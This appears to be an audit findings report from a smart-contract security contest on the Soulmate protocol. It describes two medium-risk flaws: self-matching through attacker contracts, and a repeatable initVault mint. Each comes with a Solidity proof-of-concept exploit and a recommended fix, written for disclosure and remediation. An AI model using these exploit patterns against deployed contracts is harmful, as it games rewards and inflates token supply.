# First Flight #9: Soulmate - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)

- ## Medium Risk Findings
    - ### [M-01. You can marry yourself in Soulmate.sol using smart contracts. ](#M-01)
    - ### [M-02. Initializer function in LoveToken.sol can be called multiple times.  ](#M-02)



# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #9

### Dates: Feb 8th, 2024 - Feb 15th, 2024

[See more contest details here](https://www.codehawks.com/contests/clsathvgg0005yhmxmoe455mm)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 0
   - Medium: 2
   - Low: 0



		
# Medium Risk Findings

## <a id='M-01'></a>M-01. You can marry yourself in Soulmate.sol using smart contracts.             

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-02-soulmate/blob/b3f9227942ffd5c443ce6bccaa980fea0304c38f/src/Soulmate.sol#L62

## Summary
The description states that the point of the Soulmate Protocol is to "mint your shared Soulbound NFT with an unknown person, and get LoveToken as a reward for staying with your soulmate."  However, the ability to deploy smart contracts allows you to ensure that the person that you are married to is yourself. This destroys the risk of a "divorce" and you can sit still and collect LoveTokens with no risk. 

This vulnerability stems from the fact that partners are assigned to each other just in the order that they call the minSoulmateToken function. A user can deploy two smart contracts back to back to ensure that their smart contracts end up being married to each other. 

## Vulnerability Details

Here is a simple smart contract designed to call mintSoulmateToken()

contract SelfMarriage{
    Soulmate public target;

    constructor(address _target){
        target = Soulmate(_target);
        target.mintSoulmateToken();
    }
}


Here is a proof of concept for using the protocol to marry yourself. 

    function testSelfMarriage() public {
        SelfMarriage contract1 = new SelfMarriage(address(soulmate));
        SelfMarriage contract2 = new SelfMarriage(address(soulmate));

        address soulmate_address = soulmate.soulmateOf(address(contract1));
        assertEq(soulmate_address, address(contract2));

        soulmate_address = soulmate.soulmateOf(address(contract2));
        assertEq(soulmate_address, address(contract1));
    }

## Impact
Although there is no risk of funds being drained, the integrity of the protocol is at stake since its reward mechanism can be gamed. 

## Tools Used
Foundry

## Recommendations
You could fix this issue by making sure that mintSoulmateToken() function can only be called by EOAs and not smart contracts. One way to check this would be to check the size of the code at a specific address: 


    function isContract(address _addr) private returns (bool isContract){
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }
        

However, this function returns false for a contract in construction, and as the proof of concept shows, the function can easily be called in a contract constructor. Therefore, we could ensure that this does not happen by requiring that the function only be called once per block as well as only by EOAs. However, this would create significant latency issues for the users. Instead, the best way to fix this issue would be through significant reengineering that changes the methodology in which partners are matched. A potential solution could be using Oracles as a source of randomness and creating couples in such manner. 
## <a id='M-02'></a>M-02. Initializer function in LoveToken.sol can be called multiple times.              

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-02-soulmate/blob/b3f9227942ffd5c443ce6bccaa980fea0304c38f/src/LoveToken.sol#L46C14-L46C23

## Summary
The initVault function is meant to be called once at the launch of the protocol. However, it can be called as many times as wanted. To fix, create a way to limit the function to only being called once per airdrop and staking vault. Or use OpenZepplein's Initializable.sol. To fix, add boolean state variables originally set to false for both the airdrop and vault contracts. Have these bools set to true once they are called.  

## Vulnerability Details
   
 /// @notice Called at the launch of the protocol.
/// @notice Will distribute all the supply to Airdrop and Staking Contract.
    function initVault(address managerContract) public {
        if (msg.sender == airdropVault) {
            _mint(airdropVault, 500_000_000 ether);
            approve(managerContract, 500_000_000 ether);
            emit AirdropInitialized(managerContract);
        } else if (msg.sender == stakingVault) {
            _mint(stakingVault, 500_000_000 ether);
            approve(managerContract, 500_000_000 ether);
            emit StakingInitialized(managerContract);
        } else revert LoveToken__Unauthorized();
    }

Nothing prevents this function from being called multiple times accept for the goodwill of the airdropVault and the stakingVault.

## Impact
The initVault() function can be called multiple times to inflate the balance of either the airdropVault or the stakingVault.

    function testMultipleinitVault() public {
        soulmate = new Soulmate();
        loveToken = new LoveToken(ISoulmate(address(soulmate)),  address(this), address(this));

        assertEq(0, loveToken.balanceOf(address(this)));
        
        loveToken.initVault(address(this));
        assertEq(500_000_000 ether, loveToken.balanceOf(address(this)));

        loveToken.initVault(address(this));
        assertEq(1_000_000_000 ether, loveToken.balanceOf(address(this)));

        loveToken.initVault(address(this));
        assertEq(1_500_000_000 ether, loveToken.balanceOf(address(this)));
    }

## Tools Used
Foundry

## Recommendations
    /// @notice Called at the launch of the protocol.
    /// @notice Will distribute all the supply to Airdrop and Staking Contract.
    function initVault(address managerContract) public {
        if (msg.sender == airdropVault) {
            require(wasAirdropVaultInit == false, "Airdrop Vault Already Initialized");

            _mint(airdropVault, 500_000_000 ether);
            approve(managerContract, 500_000_000 ether);
            emit AirdropInitialized(managerContract);

            wasAirdropVaultInit = true;

        } else if (msg.sender == stakingVault) {
            require(wasStakingVaultInit == false, "Staking Vault Already Initialized");

            _mint(stakingVault, 500_000_000 ether);
            approve(managerContract, 500_000_000 ether);
            emit StakingInitialized(managerContract);

            wasStakingVaultInit = true;
        } else revert LoveToken__Unauthorized();
    }





